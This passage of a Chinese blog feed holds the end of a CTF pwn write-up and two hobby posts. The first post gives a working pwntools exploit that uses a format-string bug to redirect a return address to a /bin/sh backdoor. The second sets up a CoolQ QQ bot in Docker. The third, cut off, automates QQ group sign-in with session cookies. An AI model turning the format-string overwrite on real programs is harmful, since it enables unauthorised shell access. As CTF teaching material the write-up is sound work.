class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_80485C4</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"..."</span>);</span><br><span class="line">  v1 = strtok(s, <span class="string">"|"</span>);<span class="comment">//相当于split(s,"|")</span></span><br><span class="line">  <span class="built_in">printf</span>(v1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strtok(<span class="number">0</span>, <span class="string">"|"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(result);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序存在后门函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:080485AB ; __unwind &#123;</span><br><span class="line">.text:080485AB push    ebp</span><br><span class="line">.text:080485AC mov     ebp, esp</span><br><span class="line">.text:080485AE sub     esp, 8</span><br><span class="line">.text:080485B1 sub     esp, 0Ch</span><br><span class="line">.text:080485B4 push    offset command  ; &quot;/bin/sh&quot;</span><br><span class="line">.text:080485B9 call    _system</span><br><span class="line">.text:080485BE add     esp, 10h</span><br><span class="line">.text:080485C1 nop</span><br><span class="line">.text:080485C2 leave</span><br><span class="line">.text:080485C3 retn</span><br><span class="line">.text:080485</span><br></pre></td></tr></table></figure><h1 id="0x02-重点与思路"><a href="#0x02-重点与思路" class="headerlink" title="0x02 重点与思路"></a>0x02 重点与思路</h1><p>利用格式化字符串漏洞将返回地址改为后门函数</p><h2 id="一条重点"><a href="#一条重点" class="headerlink" title="一条重点"></a>一条重点</h2><p>对于<code>%ac$xn</code>，其中a为个数，x是偏移，如果此处地址里面存放的依旧是个指针(地址)，那么会向里面存放的指针所指向的地方写入数据。</p><p>即 A-&gt;B-&gt;C,A和B都是地址，则最后数据会写到C处。</p><h2 id="稍作调试"><a href="#稍作调试" class="headerlink" title="稍作调试"></a>稍作调试</h2><p>在第一个printf(0x080485F6)的位置下断点，运行，然后查看栈。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200918171501.png" alt></p><p>可以看到这两处是可以作为跳板的</p><p>ebp位置的位于偏移0xa处，下面的位于偏移0x12处</p><p><strong>不过即便每次运行的时候栈地址都会变动，但是偏移0x13处的最后一位总会是c，比如会是0c、1c、2c…..ec、fc。这便为我们爆破提供的条件。</strong></p><h2 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h2><p>以图为例，如果我们利用<code>那条重点</code>对偏移0xa处进行写入</p><p>则数据会写到如图0xffe5a238处(即修改0xffe5a238为其他值)</p><p>那么如果将0xffe5a238修改为0xffe5a20c</p><p>那么偏移0x12处也便指向了0xffe5a20c</p><p>偏移0x12处将变成: <code>0xffe5a208 -&gt; 0xffe5a20c -&gt; 0x8048697</code>的形式。(如果问为什么没有图，那是因为手残把gdb给关了…. 地址每次都是随机的，还原不回上图的值了，为了不让读者因地址变动而产生疑惑，只能用文字表示了。)</p><p>那么我们可以通过格式化字符串和<code>那条重点</code>对偏移0x12处进行写入，即修改0x8048697的值为后门函数地址。</p><p>因为栈地址是随机的，所以采用爆破。</p><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = process(<span class="string">'./fmt'</span>)</span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',26254)</span></span><br><span class="line">    elf = ELF(<span class="string">'./fmt'</span>)</span><br><span class="line"></span><br><span class="line">    backdoor = <span class="number">0x080485ab</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(c,'b * 0x080485F6')</span></span><br><span class="line"></span><br><span class="line">    c.recvuntil(<span class="string">'...\n'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'...\n'</span>)</span><br><span class="line">    payload = <span class="string">'%12c%10$hhn'</span> <span class="comment">#使偏移0x12处栈指向0x13偏移处(看运气,概率理论上是1/16)，这里可以选12(0x0c)也可以选0x1c、0x2c...0xfc都可以，反正都要爆破的...</span></span><br><span class="line">    payload += <span class="string">'|%34219c%18$hn'</span> <span class="comment">#修改返回地址为后门函数，因为只有后两字节不同，所以是$hn。</span></span><br><span class="line">    <span class="comment">#如果看懂了前面的重点与思路，理解payload应该是挺容易的。关键还是A-&gt;B-&gt;C,AB均为地址,数据会写到C处这条性质。</span></span><br><span class="line">    c.send(payload)</span><br><span class="line"></span><br><span class="line">    c.recvuntil(<span class="string">'...'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'...'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c.sendline(<span class="string">'echo aaaa'</span>)</span><br><span class="line">        c.recvuntil(<span class="string">'aaaa'</span>,timeout = <span class="number">1</span>)</span><br><span class="line">        c.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.yuque.com/u239977/cbzkn3/biczbd" target="_blank" rel="noopener">语雀</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/dva-overwatch-reading-book-ow.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>打造属于自己的QQ群机器人(已失效)</title>
    <link href="http://liul14n.top/2020/07/11/%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQ%E7%BE%A4%E6%9C%BA%E5%99%A8%E4%BA%BA(%E5%B7%B2%E5%A4%B1%E6%95%88)/"/>
    <id>http://liul14n.top/2020/07/11/打造属于自己的QQ群机器人(已失效)/</id>
    <published>2020-07-11T15:56:35.000Z</published>
    <updated>2020-12-22T08:52:08.977Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/9020d811b912c8fc93e8219deb039245d78821f0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>8月4号最新更新:</strong></p><p>最近没鼓捣Q群机器人，也没在意它的运行情况，今天鼓捣了一下发现连不上酷Q接口…</p><p>百度了一下，原来是腾讯为了推广自己的机器人，封杀了其他第三方机器人。。。酷Q也不幸遇难。唉！</p><hr><p>最近对机器人产生了挺大的兴趣(主要因为两部galgame)，偶然间也在一个QQ群里看到一个较为智能的机器人，所以我也想拥有一个QQ机器人，也就有了这篇博文。</p><p><strong>#ATRI天下第一!</strong></p><p><strong>[宇宙没有永恒的事物，所以哀叹事物的终结也毫无意义，在迎来终结之前，怎样度过这段时间才是最重要的]</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev003el.png" alt></p><h1 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h1><p>一番Google以后得知，由于QQ的消息都是会经过加密的，所以除非搞清楚QQ的某些协议和加密算法，不然自己去实现获取QQ的消息是有很大难度的。</p><p>又得知目前的QQ机器人大部分都是用一款名为酷Q的软件来实现的，主要是因为它通过神奇的方式搞清楚了QQ的协议。</p><p>在网页QQ(webqq，于19年3月去世)还在世的时候，它采用的是webqq协议，据说比较容易获取和发送消息。</p><p>而现在QQ采用的是smartqq协议，具体是怎样的我也不清楚，或者说即便知道了也很难理解。</p><p><strong>既然存在有酷Q这个软件，那么就可以利用这个软件当做一个跳板来制作属于自己的机器人了。</strong></p><p>目前的酷Q有 <code>酷Q air</code>、<code>酷Q pro</code>。</p><p>air版本目前免费，但是相对应的，功能就比pro少，比如一些发图片、发语音的功能就需要pro版才可以实现。</p><p>酷Q可以在Mac、Linux、Windows平台上运行，在Windows上主要是运行其exe文件，而在Mac和Linux上，则可以用docker的形式来运行酷Q，这也就意味着，<strong>酷Q可以挂到服务器上24小时运行</strong>。</p><p>酷Q有它自己的社区，在社区里面可以下载到各种酷Q使用者自己开发的插件，当然有些高质量插件也是要收费的，不过还是免费、开源的插件居多。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev007al.png" alt></p><h1 id="0x02-安装酷Q"><a href="#0x02-安装酷Q" class="headerlink" title="0x02 安装酷Q"></a>0x02 安装酷Q</h1><p>由于我打算把酷Q挂到服务器上，所以这里我下载的docker版本。</p><p>由于酷Q docker还是挺大的，我用docker的默认镜像下了许久也才下载了一小部分，所以这里先用一下docker的加速器。</p><h2 id="使用docker镜像加速器"><a href="#使用docker镜像加速器" class="headerlink" title="使用docker镜像加速器"></a>使用docker镜像加速器</h2><p>可以选用的加速器有网易的、阿里云的、七牛云的 等等等等…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">网易：https://hub-mirror.c.163.com/</span><br><span class="line"></span><br><span class="line">阿里云：https://&lt;你的ID&gt;.mirror.aliyuncs.com</span><br><span class="line"></span><br><span class="line">七牛云加速器：https://reg-mirror.qiniu.com</span><br></pre></td></tr></table></figure><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云镜像加速地址</a></p><p>获取到加速器地址以后修改配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>这里以使用网易加速器为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://hub-mirror.c.163.com/"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>保存退出</p><p>重启docker服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h2 id="拉取并安装酷Q-docker"><a href="#拉取并安装酷Q-docker" class="headerlink" title="拉取并安装酷Q docker"></a>拉取并安装酷Q docker</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull coolq/wine-coolq <span class="comment">#拉取酷Qdocker,时间可能会久一些</span></span><br></pre></td></tr></table></figure><p>拉取成功以后输入<code>docker images</code>可以看到<code>coolq/wine-coolq</code>的实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/coolq-data <span class="comment"># 任意路径均可,创建一个文件夹用于存放酷Q数据</span></span><br></pre></td></tr></table></figure><p>然后运行酷Q镜像，由于要安装到服务器上，所以选择后台运行的方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name=coolq -d -p 8080:9000 -p 5700:5700 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=123456 coolq/wine-coolq</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p 8080:9000</td><td>把8080改到任意端口，用于使用浏览器连接docker的桌面</td></tr><tr><td>-p 5700:5700</td><td>把前一个5700改成任意端口，用于连接酷Q的HTTP API</td></tr><tr><td>-v /root/coolq-data</td><td>改成之前新建的文件夹，用于做文件夹储存位置的映射</td></tr><tr><td>VNC_PASSWD=12345678</td><td>可以自己设置密码，用于连接docker的远程桌面</td></tr><tr><td>COOLQ_ACCOUNT=123456</td><td>登录的机器人的QQ号</td></tr></tbody></table><p>运行命令以后，当看到<code>[CQDaemon] Started CoolQ</code>即为运行成功。</p><p>这时候访问<code>http://你的服务器IP:你的端口</code>即可看到noVNC登陆，输入刚刚设置的VNC密码即可登陆VNC看到docker远程桌面。<strong>如果访问不成功的话, 可以看后面的 0x04常见问题:</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712012507.png" alt></p><p>然后就是登陆你的机器人QQ了</p><p>待会可能会出现这个提示</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013016.png" alt></p><p>选择<code>拒绝本次网页验证</code>即可</p><p>登上以后可以看到自己机器人QQ的头像，会以悬浮窗的形式出现。</p><p>右键悬浮窗以后就会有各种功能，悬浮窗默认显示消息速度，也可以自行设置显示什么。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013245.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013623.png" alt></p><p>如果不小心把这个显示悬浮窗的对勾给勾掉的话，也可以通过右键点击这个蓝色的圈来替代悬浮窗。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013651.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev007bl.png" alt></p><h1 id="0x03-安装插件"><a href="#0x03-安装插件" class="headerlink" title="0x03 安装插件"></a>0x03 安装插件</h1><p>社区里面下载到的插件大都是cpk文件。</p><p>将下载到的插件存放于/coolq/app/文件夹内即可。</p><p>我尝试了一下自带的图灵机器人插件，对话什么的体验都挺棒，可惜只能免费体验3天。</p><h2 id="安装CQHTTP核心插件"><a href="#安装CQHTTP核心插件" class="headerlink" title="安装CQHTTP核心插件"></a>安装CQHTTP核心插件</h2><p>有一个插件名为CQHTTP，这应该算是一个核心插件吧，有了它就可以自己开发各种插件了，它提供较为全面的API，包括私聊、群聊、加好友、群踢人、群禁言等等等等…</p><p><a href="https://github.com/richardchien/coolq-http-api/releases" target="_blank" rel="noopener">CQHTTP下载地址</a></p><p>将其放到/coolq/app/文件夹以后来到docker远程桌面进行启用。</p><p>右键悬浮窗-应用管理-找到HTTP API-启用。</p><p>启用以后会在<code>/coolq/data/app/io.github.richardchien.coolqhttpapi/config/</code>文件夹内生成<code>你登陆的QQ号.json</code>文件。</p><p>编辑该文件，在<code>&quot;post_url&quot;</code>一项后面填入<code>http://127.0.0.1:你前面设置的HTTP API的端口(默认5700)</code>。</p><p>以我前面设置的 -p 5700:5700为例，那么我填好后的形式应该为<code>&quot;post_url&quot;: &quot;http://127.0.0.1:5700&quot;</code></p><p>填好以后保存退出。</p><p>其API文档如下:</p><p><a href="https://cqhttp.cc/docs/4.15/#/API" target="_blank" rel="noopener">HTTP API文档</a></p><p>可以写个py脚本测试一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">'user_id'</span>:<span class="number">1125214419</span>,</span><br><span class="line">        <span class="string">'message'</span>:<span class="string">'hhhhh'</span>,</span><br><span class="line">        <span class="string">'auto_escape'</span>:<span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">api_url = <span class="string">'http://127.0.0.1:5700/send_private_msg'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(api_url,data)</span><br></pre></td></tr></table></figure><p>发现返回<code>&lt;Response [200]&gt;</code>,而且我的大号收到了来自QQ机器人的<code>hhhhh</code>消息，这个应该是需要加了好友才行。</p><p>其他API也可以自行测试。</p><p><strong>不过发群聊有可能会因为刚挂到服务器，算是异地登录而失败，即便返回的也是200状态码，但依然收不到消息。</strong></p><h2 id="其他插件"><a href="#其他插件" class="headerlink" title="其他插件"></a>其他插件</h2><p>粗略逛了逛社区，发现几个还是挺不错的免费插件</p><p><a href="https://cqp.cc/t/27551" target="_blank" rel="noopener">smile娱乐 插件</a></p><p><a href="https://cqp.cc/t/50939" target="_blank" rel="noopener">PIXIV查询</a></p><p><a href="https://cqp.cc/t/49946" target="_blank" rel="noopener">关注早晚安</a></p><p>还有挺多宠物系统、还有一些游戏系统，自行发现吧。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev008al.png" alt></p><h1 id="0x04-常见问题"><a href="#0x04-常见问题" class="headerlink" title="0x04 常见问题"></a>0x04 常见问题</h1><h2 id="浏览器中访问docker远程桌面失败"><a href="#浏览器中访问docker远程桌面失败" class="headerlink" title="浏览器中访问docker远程桌面失败"></a>浏览器中访问docker远程桌面失败</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述:"></a>问题描述:</h3><p>访问<code>http://你的服务器IP:你的端口</code>失败，但是通过localhost是可以正常访问的</p><h3 id="问题解决方案"><a href="#问题解决方案" class="headerlink" title="问题解决方案:"></a>问题解决方案:</h3><p>由于通过localhost可以正常访问，说明不是部署问题，那么考虑到应该是服务器的端口是禁止访问的。</p><p>以阿里云服务器为例:可以在控制台打开对应端口，具体操作看下面参考链接</p><p><a href="https://yq.aliyun.com/articles/701181" target="_blank" rel="noopener">参考链接</a></p><h2 id="安装好的插件在docker远程桌面显示不全"><a href="#安装好的插件在docker远程桌面显示不全" class="headerlink" title="安装好的插件在docker远程桌面显示不全"></a>安装好的插件在docker远程桌面显示不全</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述:"></a>问题描述:</h3><p>安装好的插件，在docker远程桌面显示不全，总是缺右侧的一部分，导致许多插件无法正常使用(无法按到如 保存配置 等按钮)，把插件往左拖拽依然显示不全。</p><p>比如 smile娱乐 插件：</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712020750.png" alt></p><p>只能显示到这样，拖拽到左侧也依然只能显示这些。</p><p>而完整的插件界面应该是这样的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712021439.png" alt></p><p>这样就导致这个插件无法保存、无法关闭(只能靠重启docker…555)而影响了插件的正常使用。</p><h3 id="问题解决方案-1"><a href="#问题解决方案-1" class="headerlink" title="问题解决方案:"></a>问题解决方案:</h3><p>这个问题困扰我好几天了，各种Google也无果，酷Q社区的求助帖也看了好多，也没有对应症状。。。而且酷Q社区发求助帖需要权限…</p><p>直到昨天我突发灵感，会不会和docker远程桌面的分辨率有关呢？这个远程桌面分辨率确实有点小。</p><p>按照灵感，我通过命令行的形式设置了分辨率</p><p>在docker远程桌面启动命令行</p><p>通过命令<code>xrandr</code>查看支持的分辨率。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712021706.png" alt></p><p>然后随便选一个吧，1024×768应该就可以，不需要太大。</p><p>由于1024×768是第一个，所以<code>xrandr -s 11</code>来选择第一个分辨率。</p><p>设置好分辨率以后，再打开那个插件的配置界面，就能完整显示了!</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev011al.png" alt></p><h1 id="0x05-写在最后"><a href="#0x05-写在最后" class="headerlink" title="0x05 写在最后"></a>0x05 写在最后</h1><h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><p>个人觉得开发一些插件用来完善自己的机器人是非常有趣的，<strong>可能我还是爱开发更多一点吧</strong>。</p><p>虽然这只是一个QQ机器人，跟ATRI这种高性能机器人还差得远呢。</p><p>但ATRI有可能是有生之年系列，或者有生之年世上已经有这样的机器人被生产制造出来了，但我可能买不起555</p><p>科技飞速发展，谁又能预料到未来是什么模样的呢?</p><p>也正是这种未知与神秘，才让生活充满了乐趣吧。</p><h2 id="ATRI-天下第一"><a href="#ATRI-天下第一" class="headerlink" title="ATRI 天下第一"></a>ATRI 天下第一</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev010al.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev010bl.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev012bl.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev017al.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev021al.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/9020d811b912c8fc93e8219deb039245d78821f0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随手小记" scheme="http://liul14n.top/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>[原创] QQ群自动签到脚本(已失效)</title>
    <link href="http://liul14n.top/2020/07/03/%E5%8E%9F%E5%88%9B-QQ%E7%BE%A4%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/"/>
    <id>http://liul14n.top/2020/07/03/原创-QQ群自动签到脚本/</id>
    <published>2020-07-03T13:45:22.000Z</published>
    <updated>2020-12-22T08:49:08.131Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/Hatsune_miku_1563684099804.jpeg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>2020年8月15，腾讯升级群功能，导致该脚本已失效！内容仅供参考。</strong></p><p>许久未更博。</p><p>忽然想刷一下QQ的群聊等级，然后看了看升级的规则，有一项是群签到。</p><p>通过群签到每天最多获得15积分。</p><p>而群签到的“本群首签”会获得3积分，这样的话，自己准备5个群就能获得每天的积分了。</p><p>当然如果想更快提高群聊等级，还可以每天向某个群上传十个文件。</p><p><strong>不过每天都运行这个脚本的话，还是比较麻烦的，所以直接弄成自动化的就好了。即把脚本挂到服务器上，设置成一个定时任务。 Nice~</strong></p><p>脚本是我自己写的，许多地方其实还是可以优化的，比如加一些异常捕获机制，但是懒…就没去弄。</p><h1 id="0x01-原理说明"><a href="#0x01-原理说明" class="headerlink" title="0x01 原理说明"></a>0x01 原理说明</h1><p><strong>基于python的requests库和selenium库来实现各功能。</strong></p><p>通过抓包可以得知: Q群签到实际上是通过向URL ‘<a href="https://qun.qq.com/cgi-bin/qiandao/sign/publish&#39;" target="_blank" rel="noopener">https://qun.qq.com/cgi-bin/qiandao/sign/publish&#39;</a> 进行post传参。</p><p>首先我们需要cookie中的两个主要部分：uin和skey</p><p>uin是根据QQ号来的，是不会变的，它有一个规律：</p><p>如果你QQ号小于等于9位，则自动在前面补0凑成10位，然后在最前面补一个小写字母’o’；如果你QQ号是10位的，则只进行在最前面补’o’的操作。</p><p>比如QQ号 123456789的uin 就是 o0123456789</p><p>QQ号1122334455的uin就是o1122334455</p><p><strong>emmmm11位QQ的未进行测试，可自行测试。(登陆QQ空间看cookie即可)</strong></p><p>而skey是随机生成的，一般以字符‘@’开头，总长度好像是10位?还是11位来着…..</p><p>这个也可以通过登陆QQ空间看cookie获取。</p><p><strong>曾经试过一段时间，手动登陆QQ空间拿到skey，然后用这个skey跑签到脚本，它只能用两天…. 至于是24小时还是48小时我也没去仔细测…毕竟就算能用一星期，来回手动换也是很麻烦的，而我的目的是实现全自动。</strong></p><p>而其他的一些参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'bkn'</span>: bkn,<span class="comment">#这是根据skey按照一个算法生成的,等下会介绍</span></span><br><span class="line">    <span class="string">"category_id"</span>: <span class="number">9</span>,<span class="comment">#类别ID,这是Q群签到的一个选项来着...抓包拿到的是9,可以自行更改</span></span><br><span class="line">    <span class="string">"page"</span>: <span class="number">0</span>,<span class="comment">#好像和其他几个有关联?</span></span><br><span class="line">    <span class="string">"pic_id"</span>: <span class="number">124</span>,<span class="comment">#签到图片ID</span></span><br><span class="line">    <span class="string">'gc'</span>: gc,<span class="comment">#QQ群号</span></span><br><span class="line">    <span class="string">'client'</span>: <span class="string">'2'</span>,<span class="comment">#我也不知道,反正我抓包拿到的是2...应该能自行更改</span></span><br><span class="line">    <span class="string">'lgt'</span>: <span class="string">'0'</span>,<span class="comment">#经度</span></span><br><span class="line">    <span class="string">'lat'</span>: <span class="string">'0'</span>,<span class="comment">#纬度</span></span><br><span class="line">    <span class="string">'poi'</span>: <span class="string">'签到地点'</span>,<span class="comment">#可以自行更改</span></span><br><span class="line">    <span class="string">'text'</span>: <span class="string">'你想说的话'</span><span class="comment">#可以自行更改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Getgtk</span><span class="params">(self)</span>:</span></span><br><span class="line">    hashes = <span class="number">5381</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> self.skey:</span><br><span class="line">        hashes += (hashes &lt;&lt; <span class="number">5</span>) + ord(letter)</span><br><span class="line">    <span class="keyword">return</span> hashes &amp; <span class="number">0x7fffffff</span></span><br></pre></td></tr></table></figure><p>这个就是通过skey来求上面说的bkn参数的算法，来源于百度…</p><p>经过测试，如果签到成功的话，打印出来的content为<code>{&quot;cgicode&quot;:0,&quot;retcode&quot;:0,&quot;msg&quot;:&quot;&quot;,&quot;data&quot;:{}}</code>，所以可以用这个进行判断是否签到成功…当然直接看QQ也可以…</p><h1 id="0x02-需要解决的几个困难"><a href="#0x02-需要解决的几个困难" class="headerlink" title="0x02 需要解决的几个困难"></a>0x02 需要解决的几个困难</h1><h2 id="如何自动获取skey"><a href="#如何自动获取skey" class="headerlink" 